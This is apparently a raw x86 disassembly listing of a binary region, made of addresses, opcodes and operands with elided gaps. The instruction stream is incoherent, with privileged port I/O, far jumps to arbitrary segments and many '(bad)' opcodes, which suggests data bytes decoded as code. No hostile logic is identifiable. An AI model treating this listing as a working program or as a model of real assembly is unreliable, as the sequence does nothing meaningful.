  4202c7:	mov    esp,0x5d414def
  4202cc:	jp     0x4202e5
  4202ce:	push   edi
  4202cf:	ins    BYTE PTR es:[edi],dx
  4202d0:	add    BYTE PTR [ebp-0x5b],0xa7
  4202d4:	and    cl,cl
  4202d6:	test   al,0x88
  4202d8:	jo     0x42027a
  4202da:	lea    edx,[esi+0x463c7bbd]
  4202e0:	mov    DWORD PTR [esi-0x2ff05dfc],esp
  4202e6:	add    esp,DWORD PTR [ebx-0x30]
  4202e9:	in     al,0xb4
  4202eb:	xor    DWORD PTR [ebp-0x267adf8c],ebp
  4202f1:	xor    al,0x31
  4202f3:	xchg   ecx,eax
  4202f4:	fidivr WORD PTR [edx-0x1]
  4202f7:	jbe    0x420328
  4202f9:	arpl   si,di
  4202fb:	scas   al,BYTE PTR es:[edi]
  4202fc:	repz int 0x78
  4202ff:	int3   
  420300:	add    BYTE PTR [ebx],al
  420302:	fst    st(3)
  420304:	pop    ebp
  420305:	pop    edx
  420306:	shl    DWORD PTR [eax-0x18],1
  420309:	xchg   esi,eax
  42030a:	xchg   edi,eax
  42030b:	fcom   DWORD PTR [ecx+0x68a8e4bf]
	...
  420371:	add    BYTE PTR [eax],al
  420373:	add    BYTE PTR [ecx+0x6],al
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	mov    edx,0x6b9df169
  420385:	push   edi
  420386:	add    DWORD PTR [eax],eax
  420388:	add    eax,0xc5000001
  42038d:	ins    BYTE PTR es:[edi],dx
  42038e:	pop    edx
  42038f:	inc    esp
  420390:	mov    ch,0x3
  420392:	mov    edi,0x4ae2aaeb
  420397:	lea    ebp,[edi+0x7e8ac042]
  42039d:	bound  esp,QWORD PTR [edx]
  42039f:	dec    esi
  4203a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203a1:	outs   dx,DWORD PTR ds:[esi]
  4203a2:	mov    ds:0x237e35e9,al
  4203a7:	call   0x8e98:0x7df29c3e
  4203ae:	pop    edx
  4203af:	sub    al,0x68
  4203b1:	and    bh,BYTE PTR [edi-0x31]
  4203b4:	mov    eax,edx
  4203b6:	into   
  4203b7:	pop    ds
  4203b8:	sub    al,0xcf
  4203ba:	stc    
  4203bb:	dec    eax
  4203bc:	add    al,0xe8
  4203be:	in     al,dx
  4203bf:	loop   0x420376
  4203c1:	xchg   dh,ah
  4203c3:	mov    ds:0x4c1d37f4,al
  4203c8:	ret    0xabcd
  4203cb:	pcmpgtd mm6,mm2
  4203ce:	call   0xe987:0x7d391af6
  4203d5:	mov    al,0x63
  4203d7:	push   esp
  4203d8:	jae    0x42035f
  4203da:	call   DWORD PTR [edi+0x60]
  4203dd:	aam    0xd7
  4203df:	js     0x420420
  4203e1:	push   ebp
  4203e2:	call   0x3b54:0x714f71a3
  4203e9:	adc    al,dh
  4203eb:	stc    
  4203ec:	adc    DWORD PTR [ebp+0x5d],edi
  4203ef:	jae    0x420456
  4203f1:	adc    DWORD PTR [edi],ecx
  4203f3:	fisub  WORD PTR [ecx+ebp*2+0x6f]
  4203f7:	out    dx,eax
  4203f8:	call   DWORD PTR [esi]
  4203fa:	push   cs
  4203fb:	pop    ebp
  4203fc:	sub    edi,DWORD PTR [edi-0x1c]
  4203ff:	lock push cs
  420401:	or     eax,0xb6186b2
  420406:	aaa    
  420407:	retf   0xad85
  42040a:	dec    edi
  42040b:	mov    bh,0xd2
  42040d:	loopne 0x420467
  42040f:	bnd jns 0x4203ad
  420412:	inc    ebx
  420413:	cmp    BYTE PTR [ebx],ch
  420415:	and    DWORD PTR [edx+edi*1+0x468ecc1e],esp
  42041c:	popa   
  42041d:	fild   DWORD PTR [ebp-0x6d]
  420420:	lods   al,BYTE PTR ds:[esi]
  420421:	or     DWORD PTR [edx+esi*8-0x3c],edi
  420425:	xchg   ebp,eax
  420426:	fcmovnbe st,st(6)
  420428:	dec    esp
  420429:	xor    ah,0xe4
  42042c:	mul    dl
  42042e:	mov    cl,0x4c
  420430:	mov    dl,0x24
  420432:	pop    ss
  420433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420434:	sbb    DWORD PTR ds:[edx-0x70],0xfffffff1
  420439:	fst    QWORD PTR [ebx]
  42043b:	ins    BYTE PTR es:[edi],dx
  42043c:	ss fs jge 0x42041b
  420440:	popf   
  420441:	out    0xb9,al
  420443:	push   edi
  420444:	adc    BYTE PTR [esi+edi*8],dl
  420447:	cmp    eax,0x868eb569
  42044d:	add    ebp,DWORD PTR [ecx]
  42044f:	inc    edi
  420450:	pop    edi
  420451:	out    0x6c,eax
  420453:	fucomip st,st(2)
  420455:	add    DWORD PTR [esi+0x640204ab],ecx
  42045b:	out    dx,eax
  42045c:	jnp    0x4204c0
  42045e:	outs   dx,BYTE PTR ds:[esi]
  42045f:	call   0x3b99:0x4e4b41de
  420466:	cmp    BYTE PTR [edi+ebp*8+0x26],al
  42046a:	cmp    edi,esi
  42046c:	std    
  42046d:	sbb    ch,bl
  42046f:	or     esp,ebp
  420471:	dec    edi
  420472:	imul   eax,esp,0x2a
  420475:	mov    dh,0x80
  420477:	repnz mov al,0xd9
  42047a:	shl    BYTE PTR [ebx+0x5e],0x92
  42047e:	retf   0xd2f5
  420481:	xor    ebx,DWORD PTR [eax]
  420483:	xchg   edx,eax
  420484:	pop    edx
  420485:	pop    ebx
  420486:	mov    ecx,0x12698538
  42048b:	les    eax,FWORD PTR [ecx]
  42048d:	fs jns 0x4204b2
  420490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  4204f1:	add    BYTE PTR [eax],al
  4204f3:	add    BYTE PTR [esi+0x7f125794],ch
  4204f9:	shr    edi,cl
  4204fb:	mov    esp,0x5a7f6c39
  420500:	loope  0x420542
  420502:	(bad)  
  420503:	shl    DWORD PTR [eax+0x58],cl
  420506:	add    DWORD PTR [eax],eax
  420508:	add    eax,0x33000001
  42050d:	or     DWORD PTR [ebx+0x320d76de],ecx
  420513:	and    al,0xa9
  420515:	loop   0x4204d2
  420517:	or     eax,0xff2370b3
  42051c:	aaa    
  42051d:	shl    BYTE PTR [edx+0x64],0x81
  420521:	pop    edi
  420522:	cmc    
  420523:	(bad)  
  420524:	sahf   
  420525:	mov    ds:0xc343537c,eax
  42052a:	jb     0x4204cb
  42052c:	mov    dh,0xc5
  42052e:	fucom  st(7)
  420530:	and    BYTE PTR [edx-0x5b85cb19],bl
  420536:	pusha  
  420537:	bound  esi,QWORD PTR [edi+ebx*2]
  42053a:	inc    esp
  42053b:	bound  esi,QWORD PTR [edi]
  42053d:	stos   DWORD PTR es:[edi],eax
  42053e:	scas   eax,DWORD PTR es:[edi]
  42053f:	mov    bh,0xe
  420541:	retf   0xeccd
  420544:	xor    ah,bh
  420546:	test   ebx,edx
  420548:	pop    edi
  420549:	xor    DWORD PTR [esi-0x24],edx
  42054c:	ret    0xac87
  42054f:	pop    ecx
  420550:	aas    
  420551:	out    dx,eax
  420552:	popa   
  420553:	retf   0xad8
  420556:	inc    esi
  420557:	sbb    edi,esi
  420559:	test   DWORD PTR [edx-0x44c9efdc],esp
  42055f:	jg     0x42056e
  420561:	loope  0x4205dd
  420563:	stc    
  420564:	sbb    BYTE PTR cs:[ebx-0x143d2da4],bh
  42056b:	mov    bl,BYTE PTR [ebx-0x13]
  42056e:	stc    
  42056f:	push   edi
  420570:	adc    DWORD PTR [esi+0x7c],edi
  420573:	fldcw  WORD PTR [edi]
  420575:	mov    edx,0xb1c65463
  42057a:	mov    ds:0x6f209fe,eax
  42057f:	mov    ebx,0xf0d0a8fb
  420584:	lea    ebx,[ebx-0x5ce5a95a]
  42058a:	loope  0x420551
  42058c:	add    cl,cl
  42058e:	dec    esi
  42058f:	mul    BYTE PTR ds:0x678b669a
  420595:	aam    0xb2
  420597:	repz add DWORD PTR [esi],0x8b757fbd
  42059e:	push   esi
  42059f:	add    ecx,eax
  4205a1:	ret    
  4205a2:	sbb    DWORD PTR [eax+0x61],edx
  4205a5:	push   eax
  4205a6:	jl     0x4205ca
  4205a8:	mov    bl,0xa0
  4205aa:	dec    edi
  4205ab:	mov    ah,0xa7
  4205ad:	and    DWORD PTR [ebp-0x57010135],edx
  4205b3:	jl     0x420563
  4205b5:	rol    DWORD PTR [edx],1
  4205b7:	cmp    al,0x2e
  4205b9:	push   eax
  4205ba:	jge    0x4205a2
  4205bc:	fld    TBYTE PTR [ecx+0x5d]
  4205bf:	or     bl,dl
  4205c1:	pusha  
  4205c2:	fmul   DWORD PTR [edi-0x2b69d88a]
  4205c8:	and    esi,DWORD PTR [edi]
  4205ca:	adc    ch,BYTE PTR [ecx+ebx*2]
  4205cd:	jns    0x42056e
  4205cf:	adc    edx,DWORD PTR [esi+0x3a2fd1f0]
  4205d5:	repnz mov ecx,0xa7fdacd3
  4205db:	rol    ch,0x6
  4205de:	pop    ecx
  4205df:	xor    al,0xfb
  4205e1:	cmp    cl,BYTE PTR [eax-0x24]
  4205e4:	shl    DWORD PTR [edx],0x9d
  4205e7:	gs mov esi,0x316cb23a
  4205ed:	imul   ebp,ebx,0x9b59c3a7
  4205f3:	dec    esi
  4205f4:	sbb    DWORD PTR [ecx+0x2101dd40],ecx
  4205fa:	cwde   
  4205fb:	test   eax,0x9b91b526
  420600:	jle    0x4205a2
  420602:	ins    BYTE PTR es:[edi],dx
  420603:	mov    ds:0xc5b1e372,al
  420608:	sub    dh,BYTE PTR [edi]
  42060a:	xchg   esi,eax
  42060b:	push   esi
  42060c:	aas    
  42060d:	retf   
  42060e:	xor    edi,esp
  420610:	mov    BYTE PTR [eax],0x0
	...
  420673:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42067a:	mov    ah,0xec
  42067c:	lds    eax,FWORD PTR [eax]
  42067e:	aad    0x78
  420680:	push   ebx
  420681:	mov    ch,BYTE PTR [esi+0x15975e7]
  420687:	add    BYTE PTR ds:0xf5000001,al
  42068d:	sahf   
  42068e:	mov    dh,0xcd
  420690:	nop
  420691:	ss (bad) 
  420693:	xchg   esp,eax
  420694:	shl    BYTE PTR [eax],cl
  420696:	or     bh,dl
  420698:	inc    eax
  420699:	in     al,dx
  42069a:	push   edx
  42069b:	into   
  42069c:	inc    ebp
  42069d:	jns    0x420631
  42069f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206a0:	inc    ebp
  4206a1:	mov    eax,edx
  4206a3:	jg     0x4206c5
  4206a5:	(bad)
  4206a9:	fcom   DWORD PTR [ebx+edx*2-0x18]
  4206ad:	push   DWORD PTR [edx+0x56d1a743]
  4206b3:	sub    dl,dh
  4206b5:	lock or DWORD PTR ds:0xae95bb85,eax
  4206bc:	bound  ebx,QWORD PTR ds:0x7fb89a39
  4206c2:	add    DWORD PTR [edi+edi*8],ebp
  4206c5:	test   BYTE PTR [edx-0x6e],dh
  4206c8:	push   ebp
  4206c9:	es out 0x1b,eax
  4206cc:	inc    ebx
  4206cd:	xchg   edx,eax
  4206ce:	test   eax,0x19bdf203
  4206d3:	outs   dx,DWORD PTR ds:[esi]
  4206d4:	push   ebx
  4206d5:	sbb    eax,DWORD PTR [ecx]
  4206d7:	and    ch,dh
  4206d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206da:	push   cs
  4206db:	es ror esi,1
  4206de:	ins    DWORD PTR es:[edi],dx
  4206df:	sbb    eax,0x8ccb18c8
  4206e4:	std    
  4206e5:	rsm    
  4206e7:	xor    eax,0x4527d4bd
  4206ec:	stos   BYTE PTR es:[edi],al
  4206ed:	aad    0x1b
  4206ef:	outs   dx,BYTE PTR ds:[esi]
  4206f0:	arpl   WORD PTR [ebx],sp
  4206f2:	mov    ds:0x4080d68f,eax
  4206f7:	mov    ch,0x67
  4206f9:	clc    
  4206fa:	adc    al,0x8e
  4206fc:	push   ecx
  4206fd:	pop    edx
  4206fe:	adc    dh,BYTE PTR [ecx-0x55434e48]
  420704:	shr    BYTE PTR [esi],0xd4
  420707:	jmp    0x4206fc
  420709:	jbe    0x420760
  42070b:	loope  0x4206d4
  42070d:	push   ds
  42070e:	shl    DWORD PTR [edx-0x6e4b6483],0x12
  420715:	push   ecx
  420716:	and    DWORD PTR [esi],0xe0670230
  42071c:	mov    dl,0x4e
  42071e:	(bad)
  420722:	adc    bh,al
  420724:	jmp    0xaa83:0x12cb0a92
  42072b:	aas    
  42072c:	cmc    
  42072d:	sub    BYTE PTR [ebx],ch
  42072f:	int3   
  420730:	mov    edi,0xad86f050
  420735:	pop    ebp
  420736:	add    BYTE PTR [ebx],al
  420738:	je     0x420709
  42073a:	push   esi
  42073b:	mov    al,ds:0xf9bdd3c2
  420740:	fstp   st(0)
  420742:	push   0xe0783fe7
  420747:	and    BYTE PTR [eax+0x72c90832],cl
  42074d:	mov    dl,0xe4
  42074f:	out    dx,eax
  420750:	jecxz  0x4207af
  420752:	les    edi,FWORD PTR [edx]
  420754:	mov    ecx,0x12fd7290
  420759:	push   eax
  42075a:	mov    eax,0x89aca8e9
  42075f:	xor    eax,0x4f281491
  420764:	mov    al,ds:0x559b2078
  420769:	loopne 0x420706
  42076b:	dec    edx
  42076c:	rol    WORD PTR [edi+eiz*2],0x49
  420771:	or     al,0x4f
  420773:	mov    esp,0xa630a94c
  420778:	clc    
  420779:	mov    al,0x31
  42077b:	sbb    DWORD PTR [esi+0x54108939],ebx
  420781:	mov    ebp,0x3b2fee08
  420786:	cmp    DWORD PTR [esi-0x3928d9db],ecx
  42078c:	lahf   
  42078d:	ret    0xb5cd
  420790:	lods   eax,DWORD PTR ds:[esi]
	...
  4207f1:	add    BYTE PTR [eax],al
  4207f3:	add    BYTE PTR [ecx-0x587fdad1],cl
  4207f9:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  4207ff:	pusha  
  420800:	scas   eax,DWORD PTR es:[edi]
  420801:	cmp    edi,DWORD PTR gs:[eax+0x15a7a]
  420808:	add    eax,0xfc000001
  42080d:	or     DWORD PTR [edi+0x653e568b],ecx
  420813:	push   ss
  420814:	sbb    DWORD PTR [ebx+0x62],ebx
  420817:	lods   eax,DWORD PTR ds:[esi]
  420818:	add    al,dh
  42081a:	enter  0x3da3,0xcb
  42081e:	jmp    FWORD PTR [esp+esi*4]
  420821:	sti    
  420822:	iret   
  420823:	out    dx,eax
  420824:	xchg   ecx,eax
  420825:	xchg   DWORD PTR [eax+0x75d3b4f3],ebx
  42082b:	sbb    BYTE PTR [eax+0x35],bl
  42082e:	xchg   DWORD PTR [esi],edx
  420830:	cwde   
  420831:	mov    bl,0xee
  420833:	fs mov fs,WORD PTR ss:[ebp-0x6d]
  420838:	(bad)  
  420839:	es leave 
  42083b:	jmp    0x420837
  42083d:	inc    esi
  42083e:	xlat   BYTE PTR ds:[ebx]
  42083f:	fs cld 
  420841:	mov    eax,ds:0x150a4569
  420846:	or     eax,0x54f7dd6
  42084b:	push   cs
  42084c:	push   ebx
  42084d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42084e:	cld    
  42084f:	cmc    
  420850:	sti    
  420851:	cmp    bh,dh
  420853:	ret    0xd1bf
  420856:	lahf   
  420857:	jg     0x420897
  420859:	in     al,dx
  42085a:	aas    
  42085b:	sbb    ah,BYTE PTR [edx-0x1e]
  42085e:	retf   0xb0b2
  420861:	les    ebx,FWORD PTR [eax+0x6b]
  420864:	popf   
  420865:	out    0xeb,eax
  420867:	jae    0x42083c
  420869:	dec    esp
  42086a:	ins    BYTE PTR es:[edi],dx
  42086b:	adc    ch,dh
  42086d:	repz and BYTE PTR [eax-0x2ead0380],dl
  420874:	stos   BYTE PTR es:[edi],al
  420875:	sbb    cl,bh
  420877:	mov    ch,0x2
  420879:	add    DWORD PTR [edx-0x5b],ebx
  42087c:	js     0x4208cf
  42087e:	aaa    
  42087f:	mov    ch,al
  420881:	dec    esp
  420882:	ror    ebp,cl
  420884:	aad    0xc0
  420886:	mov    ah,BYTE PTR [ecx-0x65]
  420889:	popa   
  42088a:	mov    BYTE PTR [eax],ch
  42088c:	inc    ecx
  42088d:	stos   BYTE PTR es:[edi],al
  42088e:	inc    esp
  42088f:	scas   eax,DWORD PTR es:[edi]
  420890:	rcl    dl,0xa3
  420893:	fsubr  st,st(3)
  420895:	jmp    0x58114070
  42089a:	sub    DWORD PTR [edx+0x51],esp
  42089d:	sub    BYTE PTR [ebx+ecx*8+0x8],0xe5
  4208a2:	stos   DWORD PTR es:[edi],eax
  4208a3:	jb     0x420854
  4208a5:	adc    BYTE PTR [ecx+eax*2+0x47],al
  4208a9:	mov    edx,esp
  4208ab:	cmp    al,0x25
  4208ad:	sbb    BYTE PTR [ecx],bh
  4208af:	adc    bl,0xfb
  4208b2:	das    
  4208b3:	pushf  
  4208b4:	mov    BYTE PTR [edi+edx*8-0x4b],dh
  4208b8:	aaa    
  4208b9:	(bad)  
  4208bb:	push   ds
  4208bc:	xchg   esp,eax
  4208bd:	lahf   
  4208be:	dec    ebx
  4208bf:	bswap  edi
  4208c1:	mov    al,0xde
  4208c3:	mov    al,0x74
  4208c5:	dec    edi
  4208c6:	cmp    edi,DWORD PTR [esi-0x1e3d006b]
  4208cc:	imul   edi,DWORD PTR [eax+esi*4+0x7230bec7],0x40
  4208d4:	ins    DWORD PTR es:[edi],dx
  4208d5:	rcr    BYTE PTR [eax+0x7f],cl
  4208d8:	ds out 0x1c,eax
  4208db:	loopne 0x4208e5
  4208dd:	pop    ebx
  4208de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208df:	pop    ss
  4208e0:	inc    ecx
  4208e1:	xchg   ebp,eax
  4208e2:	ret    
  4208e3:	jecxz  0x4208c0
  4208e5:	or     eax,0x88094fd7
  4208ea:	repz in eax,0x83
  4208ed:	(bad)  
  4208ef:	add    eax,0x34b81e47
  4208f4:	sbb    edi,ebx
  4208f6:	test   ebp,edi
  4208f8:	add    DWORD PTR [edi-0xc9904c3],0x8daa569a
  420902:	stc    
  420903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420904:	out    dx,eax
  420905:	jmp    0xe0df1216
  42090a:	sub    dl,BYTE PTR [ebp+0x4f]
  42090d:	mov    cl,0x60
  42090f:	dec    esi
  420910:	sub    al,0x0
	...
  420972:	add    BYTE PTR [eax],al
  420974:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0x18
  420981:	repnz push ds
  420983:	and    al,0x7f
  420985:	pop    ebx
  420986:	add    DWORD PTR [eax],eax
  420988:	add    eax,0x55000001
  42098d:	jae    0x4209dc
  42098f:	dec    ebp
  420990:	push   ebp
  420991:	xor    ebp,DWORD PTR [esp+eiz*2+0xc26cceb]
  420998:	sar    DWORD PTR [esp+ebx*4+0x34a48d18],1
  42099f:	(bad)  
  4209a0:	pop    eax
  4209a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209a2:	scas   al,BYTE PTR es:[edi]
  4209a3:	jg     0x42098b
  4209a5:	dec    ebx
  4209a6:	popf   
  4209a7:	ja     0x4209a4
  4209a9:	pop    es
  4209aa:	dec    esi
  4209ab:	sar    BYTE PTR [ebp-0x760d764b],cl
  4209b1:	lea    ecx,[ebp-0x48e973af]
  4209b7:	push   edi
  4209b8:	fisttp DWORD PTR [ebp+0x1e5ef377]
  4209be:	add    ebp,ebx
  4209c0:	cmp    eax,0x8649ef1e
  4209c5:	lock and DWORD PTR [esi],esi
  4209c8:	and    al,0x2d
  4209ca:	xor    eax,eax
  4209cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209cd:	inc    esi
  4209ce:	mov    al,ds:0x428229af
  4209d3:	jnp    0x420a05
  4209d5:	adc    eax,ebx
  4209d7:	and    al,0x74
  4209d9:	jae    0x42096a
  4209db:	cs into 
  4209dd:	and    eax,DWORD PTR [ecx+0x78]
  4209e0:	and    eax,0x509a0c7b
  4209e5:	jp     0x420973
  4209e7:	and    al,0x73
  4209e9:	jp     0x42097d
  4209eb:	adc    DWORD PTR [ebx+0x42],edx
  4209ee:	cmp    eax,0x56dc2f6
  4209f3:	fsubr  DWORD PTR ds:0x7f9cc413
  4209f9:	inc    esi
  4209fa:	mov    bl,0x6a
  4209fc:	mov    dl,0xc9
  4209fe:	addr16 or ch,bl
  420a01:	clc    
  420a02:	test   eax,ebp
  420a04:	inc    ebx
  420a05:	mov    edi,esp
  420a07:	dec    ebp
  420a08:	add    esp,ecx
  420a0a:	jge    0x420990
  420a0c:	mov    dh,0xef
  420a0e:	push   ecx
  420a0f:	mov    cl,0xc6
  420a11:	sub    DWORD PTR [esi-0x30],0x2641ef8c
  420a18:	nop
  420a19:	jb     0x4209d5
  420a1b:	cmp    eax,DWORD PTR ds:0x2834dade
  420a21:	mov    bl,0xfc
  420a23:	mov    BYTE PTR [ecx+0xaf7f381],bh
  420a29:	or     al,BYTE PTR cs:[ebx]
  420a2c:	sub    DWORD PTR [ebp-0x30a141ac],ecx
  420a32:	lahf   
  420a33:	push   esi
  420a34:	aaa    
  420a35:	(bad)  
  420a36:	aam    0x71
  420a38:	mov    ah,ch
  420a3a:	ret    
  420a3b:	add    DWORD PTR [edi],edx
  420a3d:	push   ebp
  420a3e:	ret    
  420a3f:	lods   al,BYTE PTR ds:[esi]
  420a40:	les    edi,FWORD PTR [ebx+0x15]
  420a43:	and    eax,0xa4293641
  420a48:	mov    cl,0x95
  420a4a:	inc    ebp
  420a4b:	jp     0x420a74
  420a4d:	mov    eax,DWORD PTR [ebp-0x61]
  420a50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a51:	jp     0x420a71
  420a53:	icebp  
  420a54:	(bad)  
  420a55:	fist   WORD PTR [ecx]
  420a57:	mov    edx,0x7a56d108
  420a5c:	sbb    BYTE PTR [esi+eax*4+0x5d],bl
  420a60:	gs dec ebx
  420a62:	mov    ah,0x39
  420a64:	retf   0x9c7b
  420a67:	jle    0x420adc
  420a69:	mov    ah,0x13
  420a6b:	push   esi
  420a6c:	mov    edi,0x99942576
  420a71:	xor    BYTE PTR [ecx-0x2],dl
  420a74:	mov    eax,0x2af4da9a
  420a79:	(bad)  
  420a7a:	dec    eax
  420a7b:	mov    esi,DWORD PTR [esi+0x36]
  420a7e:	sbb    DWORD PTR [ecx-0x62921bf1],eax
  420a84:	repnz cwde 
  420a86:	inc    ebx
  420a87:	adc    ecx,ebp
  420a89:	fwait
  420a8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a8b:	or     eax,0x8b48bf6f
  420a90:	scas   al,BYTE PTR es:[edi]
	...
  420af1:	add    BYTE PTR [eax],al
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	adc    DWORD PTR [esi],edi
  420b02:	fwait
  420b03:	pop    ebp
  420b04:	test   BYTE PTR [ecx+eax*1+0x0],bl
  420b08:	add    eax,0xb000001
  420b0d:	mov    eax,0xcf4fb02f
  420b12:	mov    ah,BYTE PTR [edi-0x44]
  420b15:	mov    edi,0x842c3fbe
  420b1a:	inc    eax
  420b1b:	add    edx,DWORD PTR [ecx+ecx*1]
  420b1e:	test   al,0x90
  420b20:	mov    bl,BYTE PTR [eax+edi*1+0x6104634e]
  420b27:	test   BYTE PTR [esi+0x1beea033],ch
  420b2d:	sbb    BYTE PTR [edi-0x71ef06cf],ah
  420b33:	and    al,0xef
  420b35:	call   0x50f7:0x2ebe335f
  420b3c:	cmp    bh,BYTE PTR [edx-0x217ae372]
  420b42:	mov    BYTE PTR [edi-0x77],dh
  420b45:	adc    bl,al
  420b47:	fs jbe 0x420b80
  420b4a:	(bad)  
  420b4b:	je     0x420b18
  420b4d:	fisub  WORD PTR [eax]
  420b4f:	adc    ebp,DWORD PTR ds:0xc1f48c45
  420b55:	cmp    al,0x44
  420b57:	call   0xbf0a:0x8df1d394
  420b5e:	loope  0x420b69
  420b60:	mov    eax,0xefcbaf46
  420b65:	lahf   
  420b66:	(bad)  
  420b67:	jb     0x420b69
  420b69:	mov    cl,0x99
  420b6b:	es clc 
  420b6d:	int    0x13
  420b6f:	(bad)  
  420b70:	retf   0xc101
  420b73:	push   ebx
  420b74:	(bad)  
  420b75:	fld    TBYTE PTR [eax+0x45bef2e2]
  420b7b:	xchg   edi,eax
  420b7c:	out    dx,al
  420b7d:	sbb    eax,0x74c9c7e
  420b82:	imul   edi,DWORD PTR [eax+0x5e],0x591e4830
  420b89:	push   ds
  420b8a:	cmp    DWORD PTR [ebp-0x12d74f11],edx
  420b90:	cmp    ebp,esi
  420b92:	jno    0x420b55
  420b94:	sub    eax,0xdd28d2e4
  420b99:	in     eax,dx
  420b9a:	pusha  
  420b9b:	inc    ecx
  420b9c:	into   
  420b9d:	lds    edi,FWORD PTR [ecx]
  420b9f:	ins    BYTE PTR es:[edi],dx
  420ba0:	sbb    al,0x2a
  420ba2:	xchg   ecx,eax
  420ba3:	lea    edi,[eax-0x2a]
  420ba6:	aaa    
  420ba7:	pop    esi
  420ba8:	pop    eax
  420ba9:	sbb    esi,DWORD PTR [ebp-0x78b44f08]
  420baf:	jmp    0xf48e:0x8e2c37a3
  420bb6:	sub    al,0xf9
  420bb8:	or     BYTE PTR [ebx],al
  420bba:	xor    BYTE PTR [ecx+ecx*1+0x1d6d27bb],cl
  420bc1:	rcl    BYTE PTR [esi+0x736b2685],0xa
  420bc8:	scas   eax,DWORD PTR es:[edi]
  420bc9:	rep stos BYTE PTR es:[edi],al
  420bcb:	xlat   BYTE PTR ds:[ebx]
  420bcc:	jns    0x420b7a
  420bce:	or     DWORD PTR [ebp-0x52],0x969a66ed
  420bd5:	scas   eax,DWORD PTR es:[edi]
  420bd6:	mov    edx,0xe3efa5ce
  420bdb:	xor    cl,BYTE PTR [ecx-0x32]
  420bde:	pushf  
  420bdf:	mov    ebx,0xe08fd279
  420be4:	sub    BYTE PTR [ecx-0x23],cl
  420be7:	into   
  420be8:	mov    al,BYTE PTR [esi+ebx*4-0x4e]
  420bec:	gs inc edx
  420bee:	inc    edi
  420bef:	pop    ds
  420bf0:	mov    edx,0xefb1cb8d
  420bf5:	sbb    eax,0x148c9ab9
  420bfa:	mov    ecx,0xd94bcea
  420bff:	out    dx,eax
  420c00:	xor    ebx,DWORD PTR [ebx+0x2178f7fb]
  420c06:	pop    DWORD PTR [edx+0xc8f222b]
  420c0c:	je     0x420bd3
  420c0e:	adc    edx,0x15
	...
  420c74:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420c7a:	mov    edx,0x1886e3f
  420c7f:	in     eax,0xde
  420c81:	dec    edi
  420c82:	inc    edx
  420c83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c84:	mov    DWORD PTR [ebp+0x1],ebx
  420c87:	add    BYTE PTR ds:0x5c000001,al
  420c8d:	add    eax,0xcea2069b
  420c92:	pop    edx
  420c93:	repz mov al,ds:0x8c45c959
  420c99:	ret    0x4754
  420c9c:	in     al,0xe2
  420c9e:	inc    eax
  420c9f:	inc    edi
  420ca0:	repnz or al,cl
  420ca3:	xchg   ecx,eax
  420ca4:	stc    
  420ca5:	dec    ebp
  420ca6:	call   0x1996:0x47f41ef4
  420cad:	sub    ebx,DWORD PTR ds:0x1071c6d4
  420cb3:	addr16 inc esp
  420cb5:	jnp    0x420d26
  420cb7:	pop    esp
  420cb8:	pusha  
  420cb9:	stos   BYTE PTR es:[edi],al
  420cba:	dec    eax
  420cbb:	(bad)  
  420cbc:	and    eax,0xf6680b33
  420cc1:	dec    ecx
  420cc2:	stos   BYTE PTR es:[edi],al
  420cc3:	pushf  
  420cc4:	fstp   QWORD PTR [esi]
  420cc6:	push   ebp
  420cc7:	dec    edi
  420cc8:	fwait
  420cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cca:	lods   eax,DWORD PTR ds:[esi]
  420ccb:	loopne 0x420cce
  420ccd:	ret    
  420cce:	jnp    0x420cf1
  420cd0:	sub    eax,0x9e95a6ce
  420cd5:	push   ss
  420cd6:	(bad)  
  420cd7:	stos   BYTE PTR es:[edi],al
  420cd8:	pusha  
  420cd9:	nop
  420cda:	add    DWORD PTR [ecx-0x2d],ecx
  420cdd:	test   DWORD PTR [edx],eax
  420cdf:	cmp    al,0x46
  420ce1:	mov    BYTE PTR [esi-0x5e],al
  420ce4:	jmp    0x9ed16aec
  420ce9:	loop   0x420cf6
  420ceb:	mov    bl,dh
  420ced:	jmp    0xbd17:0x4853e8ec
  420cf4:	in     al,dx
  420cf5:	ins    DWORD PTR es:[edi],dx
  420cf6:	dec    esp
  420cf7:	sub    dl,cl
  420cf9:	fisub  DWORD PTR ds:0x2f403bde
  420cff:	pop    edi
  420d00:	pop    esi
  420d01:	(bad)  [ecx-0x66cf789]
  420d07:	and    al,0xfb
  420d09:	ror    DWORD PTR [ebp-0x3b],0xba
  420d0d:	mov    ds:0x4f53a3f8,al
  420d12:	repz pop ds
  420d14:	imul   ecx,ebx,0x4e394566
  420d1a:	adc    BYTE PTR [ebp+0x13],bl
  420d1d:	call   0x2ca4:0x93d723a6
  420d24:	nop
  420d25:	ja     0x420d06
  420d27:	cmp    ebx,DWORD PTR [ebp-0x17]
  420d2a:	cmp    BYTE PTR [esi-0x55],ah
  420d2d:	inc    eax
  420d2e:	sub    BYTE PTR [ebx],bh
  420d30:	inc    esp
  420d31:	push   ebp
  420d32:	xchg   ecx,eax
  420d33:	mov    bl,0x1f
  420d35:	scas   al,BYTE PTR es:[edi]
  420d36:	(bad)  
  420d37:	ffree  st(2)
